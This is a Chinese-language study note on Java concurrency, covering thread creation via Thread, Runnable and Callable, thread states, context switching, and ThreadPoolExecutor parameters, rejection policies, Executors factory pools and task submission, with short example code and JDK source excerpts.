<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++) System.out.println(i+<span class="string">&quot;听音乐&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Music m=<span class="keyword">new</span> Music();</span><br><span class="line">m.start();</span><br></pre></td></tr></table></figure>

<h3 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h3><p>需要实现<code>run()</code>方法，通过<code>Thread</code>调用<code>start()</code>方法来启动线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music1</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++) System.out.println(i+<span class="string">&quot;听音乐&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Music1 m1=<span class="keyword">new</span> Music1();</span><br><span class="line">Thread t_music=<span class="keyword">new</span> Thread(m1,<span class="string">&quot;这是Runnable线程&quot;</span>);</span><br><span class="line">t_music.start();</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread(Runnable target，name)</span><br></pre></td></tr></table></figure>

<h3 id="实现Callable接口"><a href="#实现Callable接口" class="headerlink" title="实现Callable接口"></a>实现Callable接口</h3><p>与<code>Runnable</code>相比，<code>Callable</code>可以有返回值，返回值通过<code>FutureTask</code>进行接收</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FutureTask&lt;Integer&gt; futureTask = <span class="keyword">new</span> FutureTask&lt;&gt;(<span class="keyword">new</span> Callable&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;线程开始&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">Thread thread = <span class="keyword">new</span> Thread(futureTask,<span class="string">&quot;这是callable线程&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;线程开始&quot;</span>);</span><br><span class="line">thread.start();</span><br><span class="line">System.out.println(thread.getName()+<span class="string">&quot; 获取futureTask返回值&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;future返回值:&quot;</span>+futureTask.get());</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20210110204122741.png" alt="image-20210110204122741" style="zoom: 67%;" />

<blockquote>
<ul>
<li><code>FutureTask</code>继承于<code>RunnableFuture</code>接口，<code>RunnableFuture</code>接口继承了<code>Future</code>和<code>Runnable</code>接口，实现了<code>run()</code>方法</li>
<li><code>FutureTask</code>类构造方法可传入<code>Callable</code>类型的参数，用来处理结果有返回值的情况</li>
<li><code>futureTask.get()</code>用来获取返回值，如果线程没有执行完，该方法会一直<strong>阻塞到线程执行完毕</strong></li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/20180730145740512" alt="img" style="zoom: 80%;" />

<h3 id="实现接口-vs-继承Thread"><a href="#实现接口-vs-继承Thread" class="headerlink" title="实现接口 vs 继承Thread"></a>实现接口 vs 继承Thread</h3><p>实现接口更好一些</p>
<ul>
<li>Java不支持多重继承，因为继承了Thread类就无法继承其他类，但可以实现了多个接口</li>
<li>类可能只要求可执行就行，继承整个Thread类开销过大</li>
</ul>
<blockquote>
<p>工具类<code>Executors</code>可以实现<code>Runnable</code>对象和<code>Callable</code>对象之间相互转换</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Callable&lt;T&gt; <span class="title">callable</span><span class="params">(Runnable task, T result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (task == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> RunnableAdapter&lt;T&gt;(task, result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Callable&lt;Object&gt; <span class="title">callable</span><span class="params">(Runnable task)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (task == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> RunnableAdapter&lt;Object&gt;(task, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="线程运行原理"><a href="#线程运行原理" class="headerlink" title="线程运行原理"></a>线程运行原理</h2><h3 id="栈和栈帧"><a href="#栈和栈帧" class="headerlink" title="栈和栈帧"></a>栈和栈帧</h3><p>线程使用栈内存，每个线程启动后，虚拟机都会为其分配一块栈内存(先进后出)</p>
<ul>
<li>每一个栈由多个栈帧组成， 对应每次方法调用时所占用的内存</li>
<li>每个线程只能有一个活动栈帧，对应正在执行的那个方法</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201001214757147.png" alt="image-20201001214757147" style="zoom: 67%;" />

<h3 id="线程的上下文切换"><a href="#线程的上下文切换" class="headerlink" title="线程的上下文切换"></a>线程的上下文切换</h3><blockquote>
<p>由于一些原因CPU不再执行当前的线程，转而执行另一个线程</p>
</blockquote>
<ul>
<li>线程的CPU时间片用完</li>
<li>垃圾回收</li>
<li>有更高优先级的线程需要执行</li>
<li>主动： 线程自己调用sleep/yield/wait/join/park/synchronized/lock等方法</li>
</ul>
<blockquote>
<p>当Context Switch发生时，需要由<strong>操作系统保存当前线程的状态，并恢复另一个线程的状态</strong></p>
<p>程序计数器，作用是记住下一条jvm指令的执行地址，是线程私有的</p>
</blockquote>
<ul>
<li>状态包括程序计数器、虚拟机栈每个栈帧的信息，如局部变量、操作数栈、返回地址等</li>
<li>频繁的上下文切换会影响性能</li>
</ul>
<h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><blockquote>
<p>Java层面六个状态</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201003112044132.png" alt="image-20201003112044132" style="zoom:80%;" />

<h3 id="新建new"><a href="#新建new" class="headerlink" title="新建new"></a>新建new</h3><p>新建线程对象，还未与操作系统相关联，执行<code>start()</code>方法进行<code>Runnable</code>状态</p>
<h3 id="可运行Runnable"><a href="#可运行Runnable" class="headerlink" title="可运行Runnable"></a>可运行Runnable</h3><p>可能正在运行，也可能在等待CPU时间片，包含操作系统线程状态的<code>Running</code>和<code>Ready</code></p>
<h3 id="阻塞Blocked"><a href="#阻塞Blocked" class="headerlink" title="阻塞Blocked"></a>阻塞Blocked</h3><p>等待获得一个排他锁，如果其他线程释放了锁就会结束该状态</p>
<h3 id="无限期等待waiting"><a href="#无限期等待waiting" class="headerlink" title="无限期等待waiting"></a>无限期等待waiting</h3><p>等待其他线程显示的唤醒，否则不会被分配CPU时间片。</p>
<table>
<thead>
<tr>
<th align="center">进入方法</th>
<th align="left">退出方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">没有设置<code>Timeout</code>参数的<code>Object.wait()</code>方法</td>
<td align="left"><code>Object.notify()/Object.notifyAll()</code></td>
</tr>
<tr>
<td align="center"><code>LockSupport.park()</code>方法</td>
<td align="left"><code>LockSupport.unpark(Thread)</code></td>
</tr>
<tr>
<td align="center">没有设置<code>Timeout</code>参数的<code>Thread.join()</code>方法</td>
<td align="left">被调用的线程执行完毕</td>
</tr>
</tbody></table>
<h3 id="限期等待Time-Waiting"><a href="#限期等待Time-Waiting" class="headerlink" title="限期等待Time_Waiting"></a>限期等待Time_Waiting</h3><p>无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。</p>
<ol>
<li><p>调用<code>Thread.sleep()</code>方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。</p>
</li>
<li><p>调用<code>Object.wait()</code>方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。</p>
</li>
</ol>
<p>睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。</p>
<p>阻塞和等待的区别在于，阻塞是被动的，它是在等待获取一个排它锁。而等待是主动的，通过调用<code>Thread.sleep()</code>和<code>Object.wait()</code>等方法进入</p>
<table>
<thead>
<tr>
<th align="left">进入方法</th>
<th align="center">退出方法</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Thread.sleep(Timeout)</code>方法</td>
<td align="center">时间结束</td>
</tr>
<tr>
<td align="left">设置了<code>Timeout</code>参数的<code>Object.wait(Timeout)</code>方法</td>
<td align="center">时间结束/<code>Object.notify()</code>/<code>Object.notifyAll()</code></td>
</tr>
<tr>
<td align="left">设置了<code>Timeout</code>参数的<code>Thread.join(Timeout)</code>方法</td>
<td align="center">时间结束/被调用的线程执行完毕</td>
</tr>
<tr>
<td align="left"><code>LockSupport.parkNanos()</code>方法</td>
<td align="center"><code>LockSupport.unpark(Thread)</code></td>
</tr>
<tr>
<td align="left"><code>LockSupport.parkUntil()</code>方法</td>
<td align="center"><code>LockSupport.unpark(Thread)</code></td>
</tr>
</tbody></table>
<h3 id="死亡Terminated"><a href="#死亡Terminated" class="headerlink" title="死亡Terminated"></a>死亡Terminated</h3><p>可以是线程任务结束之后自己结束，或者产生了异常而结束。</p>
<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><blockquote>
<p>线程池的顶级接口是<code>Executor</code>，<strong>管理多个异步任务的执行，无需程序员显式的管理线程的生命周期</strong></p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201005170916502.png" alt="image-20201005170916502" style="zoom:67%;" />

<h3 id="线程池状态"><a href="#线程池状态" class="headerlink" title="线程池状态"></a>线程池状态</h3><blockquote>
<p>使用<code>AtomicInteger</code>(4个字节)的高 3 位(有符号位)来表示线程状态，低29位表示线程数量</p>
<p><strong>目的：</strong>存储在一个原子变量中，目的是将线程状态和线程个数合二为一，这可以使用一次CAS原子操作进行赋值</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201005171216379.png" alt="image-20201005171216379" style="zoom:67%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//来自ThreadPoolExecutor类</span></span><br><span class="line"><span class="comment">//原子整数AtomicInteger</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger ctl = <span class="keyword">new</span> AtomicInteger(ctlOf(RUNNING, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// runState is stored in the high-order bits</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RUNNING    = -<span class="number">1</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SHUTDOWN   =  <span class="number">0</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STOP       =  <span class="number">1</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TIDYING    =  <span class="number">2</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TERMINATED =  <span class="number">3</span> &lt;&lt; COUNT_BITS;</span><br></pre></td></tr></table></figure>

<h3 id="创建线程池方法"><a href="#创建线程池方法" class="headerlink" title="创建线程池方法"></a>创建线程池方法</h3><h4 id="ThreadPoolExecutor类构造方法"><a href="#ThreadPoolExecutor类构造方法" class="headerlink" title="ThreadPoolExecutor类构造方法"></a><code>ThreadPoolExecutor</code>类构造方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">                          TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                          BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                          ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">                          RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="构造参数"><a href="#构造参数" class="headerlink" title="构造参数"></a>构造参数</h5><table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">类型</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">corePoolSize</td>
<td align="left">int</td>
<td align="left">核心线程数</td>
</tr>
<tr>
<td align="left">maximunPoolSize</td>
<td align="left">int</td>
<td align="left">最大线程数=救急线程+核心线程数</td>
</tr>
<tr>
<td align="left">keepAliveTime</td>
<td align="left">long</td>
<td align="left">生存时间-针对救急线程</td>
</tr>
<tr>
<td align="left">unit</td>
<td align="left">TimeUnit</td>
<td align="left">时间单位-针对救急线程</td>
</tr>
<tr>
<td align="left">workQueue</td>
<td align="left">BlockingQueue</td>
<td align="left">阻塞队列</td>
</tr>
<tr>
<td align="left">threadFactory</td>
<td align="left">ThreadFactory</td>
<td align="left">线程创建工厂</td>
</tr>
<tr>
<td align="left">handler</td>
<td align="left">RejectedExecutionHandler</td>
<td align="left">拒绝策略</td>
</tr>
</tbody></table>
<h5 id="拒绝策略"><a href="#拒绝策略" class="headerlink" title="拒绝策略"></a>拒绝策略</h5><p><code>ThreadPoolExecutor</code>线程池存在核心线程和救急线程</p>
<ul>
<li>当阻塞队列满(有界队列)时，又有新任务，才会动用救急线程</li>
<li>当救急线程也满时，才会动用拒绝策略</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201005174351695.png" alt="image-20201005174351695" style="zoom: 67%;" />

<blockquote>
<p>jdk提供4种拒绝策略</p>
</blockquote>
<ul>
<li>AbortPolicy：抛出<code>RejectExecutionException</code>异常，默认策略</li>
<li>CallerRunsPolicy：让调用者运行任务</li>
<li>DiscardPolicy：放弃本次任务</li>
<li>DiscardOldestPolicy：放弃队列中最早的任务，本任务取而代之</li>
</ul>
<h4 id="Executors工具类"><a href="#Executors工具类" class="headerlink" title="Executors工具类"></a>Executors工具类</h4><blockquote>
<p>提供多种线程池创建方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,</span><br><span class="line">                                  <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//LinkedBlockingQueue构造方法，长度为Integer最大值</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LinkedBlockingQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(Integer.MAX_VALUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>, <span class="keyword">new</span> ThreadFactory() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger t=<span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Thread <span class="title">newThread</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Thread(r,<span class="string">&quot;myPool_t&quot;</span>+t.getAndIncrement());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="弊端"><a href="#弊端" class="headerlink" title="弊端"></a>弊端</h5><ul>
<li><code>FixedThreadPool</code>和<code>SingleThreadPool</code>：使用的无界阻塞队列是<code>LinkedBlockingQueue</code>， 允许请求的队列长度为<code>Integer.MAX_VALUE</code>，可能挤压大量请求，造成OOM</li>
<li><code>CacheThreadPool</code>和<code>ScheduledThreadPool</code>：允许创建的最大线程数为<code>Integer.MAX_VALUE</code>，可能会创建大量的线程，造成OOM</li>
</ul>
<h3 id="四种线程池-Executors"><a href="#四种线程池-Executors" class="headerlink" title="四种线程池(Executors)"></a>四种线程池(Executors)</h3><h4 id="newFixedThreadPool"><a href="#newFixedThreadPool" class="headerlink" title="newFixedThreadPool"></a>newFixedThreadPool</h4><blockquote>
<p>固定大小的线程池，适用于 <strong>任务量已知，相对耗时</strong> 的任务</p>
</blockquote>
<p><strong>特点</strong></p>
<ul>
<li>无救急线程，最大线程数==核心线程数</li>
<li>阻塞队列<code>LinkedBlockingQueue</code>为无界，可以放任意数量的任务</li>
<li>当某个线程执行出现异常而结束时，线程池会补充一个新的线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newFixedThreadPool</span><span class="params">(<span class="keyword">int</span> nThreads)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(nThreads, nThreads,</span><br><span class="line">                                  <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="newSingleThreadPool"><a href="#newSingleThreadPool" class="headerlink" title="newSingleThreadPool"></a>newSingleThreadPool</h4><blockquote>
<p>线程固定大小为1，保证所有任务的执行顺序按照任务的提交顺序执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newSingleThreadExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FinalizableDelegatedExecutorService</span><br><span class="line">        (<span class="keyword">new</span> ThreadPoolExecutor(<span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                                <span class="number">0L</span>, TimeUnit.MILLISECONDS,</span><br><span class="line">                                <span class="keyword">new</span> LinkedBlockingQueue&lt;Runnable&gt;()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>单线程池的好处</strong></p>
<p>当线程任务执行失败，线程池还会创建新线程补救</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newSingleThreadExecutor();</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">executorService.execute(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>与固定大小线程池</strong></p>
<ul>
<li><code>Executors.newSingleThreadExecutor</code> 线程数始终为1，<strong>不能修改</strong><ul>
<li>应用装饰器模式，只对外暴露<code>ExecutorService</code>接口(只定义一些线程提交的方法)，不能调用<code>ThreadPoolExecutor</code>特有方法</li>
</ul>
</li>
<li><code>Executors.newFixedThreadPool(1)</code>初始时为1，以后<strong>还可以修改</strong><ul>
<li>对外暴露的是<code>ThreadPoolExecutor</code>对象，强转后调用<code>setCorePoolSize</code>等方法进行修改。</li>
</ul>
</li>
</ul>
<h4 id="newCachedThreadPool"><a href="#newCachedThreadPool" class="headerlink" title="newCachedThreadPool"></a>newCachedThreadPool</h4><blockquote>
<p>适用于 <strong>任务数密集，每个任务执行时间短</strong> 的任务</p>
</blockquote>
<p><strong>特点</strong></p>
<ul>
<li>无核心线程，全部都是救急线程(最大线程数为<code>Integer.MAX_VALUE</code>)</li>
<li>队列采用<code>SynchronousQueue</code>，没有容量，没有线程来取是放不进去的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExecutorService <span class="title">newCachedThreadPool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">0</span>, Integer.MAX_VALUE,</span><br><span class="line">                                  <span class="number">60L</span>, TimeUnit.SECONDS,</span><br><span class="line">                                  <span class="keyword">new</span> SynchronousQueue&lt;Runnable&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="newScheduledThreadPool"><a href="#newScheduledThreadPool" class="headerlink" title="newScheduledThreadPool"></a>newScheduledThreadPool</h4><blockquote>
<p>支持定时以及周期性执行任务的需求</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ScheduledExecutorService <span class="title">newScheduledThreadPool</span><span class="params">(<span class="keyword">int</span> corePoolSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ScheduledThreadPoolExecutor(corePoolSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="延时执行"><a href="#延时执行" class="headerlink" title="延时执行"></a>延时执行</h5><blockquote>
<p>delay-延时时间</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ScheduledFuture&lt;?&gt; schedule(Runnable command,</span><br><span class="line">                                   <span class="keyword">long</span> delay, TimeUnit unit);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(<span class="number">2</span>);</span><br><span class="line">scheduledExecutorService.schedule(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">&#125;,<span class="number">1</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">scheduledExecutorService.schedule(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">&#125;,<span class="number">1</span>, TimeUnit.MILLISECONDS);</span><br></pre></td></tr></table></figure>

<h5 id="定时执行"><a href="#定时执行" class="headerlink" title="定时执行"></a>定时执行</h5><blockquote>
<p><code>scheduleAtFixedRate</code>   每间隔1s执行</p>
<p>以下例子每隔2s执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ScheduledFuture&lt;?&gt; scheduleAtFixedRate(Runnable command,</span><br><span class="line">                                              <span class="keyword">long</span> initialDelay,</span><br><span class="line">                                              <span class="keyword">long</span> period,</span><br><span class="line">                                              TimeUnit unit);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">scheduledExecutorService.scheduleAtFixedRate(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//延时时间，时间间隔，时间单位</span></span><br><span class="line">&#125;,<span class="number">1</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>scheduledWithFixedRate</code> 会在上一次任务执行完了之后再间隔1s执行</p>
<p>以下例子每隔3s执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ScheduledFuture&lt;?&gt; scheduleWithFixedDelay(Runnable command,</span><br><span class="line">                                                 <span class="keyword">long</span> initialDelay,</span><br><span class="line">                                                 <span class="keyword">long</span> delay,</span><br><span class="line">                                                 TimeUnit unit);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">scheduledExecutorService.scheduleWithFixedDelay(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">1</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>

<h5 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h5><blockquote>
<p>java.util.Timer</p>
<p><strong>实现定时功能</strong>，但由于所有的任务都是由同一个线程调度，因此所有任务都是<strong>串行执行</strong>的</p>
<p>同一个时间只能有一个任务在执行，前一个任务的延迟或异常都会影响到之后的任务。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Timer timer=<span class="keyword">new</span> Timer();</span><br><span class="line">TimerTask timerTask1 = <span class="keyword">new</span> TimerTask() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Timer任务1&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">TimerTask timerTask2 = <span class="keyword">new</span> TimerTask() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Timer任务2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">timer.schedule(timerTask1,<span class="number">1000</span>);</span><br><span class="line">timer.schedule(timerTask2,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<h3 id="提交任务"><a href="#提交任务" class="headerlink" title="提交任务"></a>提交任务</h3><blockquote>
<p><code>ExecutorService</code>接口定义的方法</p>
</blockquote>
<h4 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h4><blockquote>
<p>来自<code>Executor</code>线程池顶级接口</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable command)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; <span class="function">Future&lt;T&gt; <span class="title">submit</span><span class="params">(Callable&lt;T&gt; task)</span></span>;</span><br><span class="line"></span><br><span class="line">Future&lt;?&gt; submit(Runnable task);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>提交任务task,用 future 获得任务执行结果</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">Future&lt;String&gt; future = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">System.out.println(future.get());</span><br></pre></td></tr></table></figure>

